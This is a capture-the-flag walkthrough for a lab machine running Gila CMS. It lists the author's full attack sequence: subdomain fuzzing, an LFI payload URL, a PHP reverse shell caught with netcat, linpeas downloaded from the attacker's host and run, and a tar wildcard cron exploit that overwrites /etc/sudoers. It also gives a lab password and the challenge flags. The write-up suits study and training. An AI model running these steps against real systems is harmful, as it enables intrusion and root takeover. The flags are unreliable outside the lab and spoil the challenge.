# CMesS - Medium

```shell
nmap -T4 -p- -A -v 10.10.222.241

sudo vim /etc/hosts
#map IP to cmess.thm

wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 403,404 http://cmess.thm/FUZZ

sudo wfuzz -c -f sub-fighter -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
#this gives false results of 290 wordlength

sudo wfuzz -c -f sub-fighter -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 290

sudo vim /etc/hosts
#add dev.cmess.thm

searchsploit gila
#this gives us LFI exploit

#setup listener
nc -nvlp 4444

#we get reverse shell on visiting uploaded shell
#upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

#in attacker machine
python3 -m http.server

#in reverse shell
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cat /opt/.password.bak
#get andre's password

ssh andre@10.10.222.241

cat user.txt

ls -la backup

cat /etc/crontab
#interesting crontab
#we can use tar wildcard char exploit

cd backup

echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh

echo "" > "--checkpoint-action=exec=sh privesc.sh"

echo "" > --checkpoint=1

sudo -l
#we can execute all commands as root now

sudo su

cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18

* The webpage on port 80 has the title 'Gila CMS'; we can enumerate the website for hidden directories.

* We have a login page at /login, but we do not have creds yet.

* We have other directories such as /admin, /author and /assets; maybe we can access them after login.

* We can add the IP to /etc/hosts and map it to cmess.thm, and try searching for subdomains.

* For vhost enumeration, we can choose wfuzz, and we filter responses with word length 290 as they are false positives.

* We get the 'dev' subdomain, so we can add it to our /etc/hosts file.

* Now, this subdomain contains a chat, which gives us the password "KPFTN_f2yxe%" for the user andre@cmess.thm

* We are able to login using these creds but this just takes us back to the home page.

* We can access /admin, and this takes us to the dashboard for Gila CMS, version 1.10.9

* Now, searching for an exploit for Gila CMS gives us a LFI exploit, following that we have the payload:

  ```http://cmess.thm/admin/fm/?f=src../../../../../../../../../WINDOWS/system32/drivers/etc/hosts```

* Using this payload, we get an option to upload files; we can upload a PHP reverse-shell file, setup listener, and activate reverse shell.

* The reverse-shell has been uploaded in the /assets folder, so we need to visit /assets/reverse-shell.php to get reverse shell.

* Now, we have shell as www-data; we can use linpeas to check for privesc.

* We get a file /opt/.password.bak, this contains password for andres; we can SSH using this password as andre.

* We have an interesting cronjob running, by root, and it runs the command ```tar -zcf``` to create a backup zip file with wildcard char.

* We can Google 'crontab tar wildcard' and we will get articles on how to exploit the given scenario.

* By moving to /backup directory and following the exploit, we can use 'sudo -l' to check commands we can execute - we can execute all commands as root.

```markdown
1. Compromise this machine and obtain user.txt - thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

2. Escalate your privileges and obtain root.txt - thm{9f85b7fdeb2cf96985bf5761a93546a2}
```
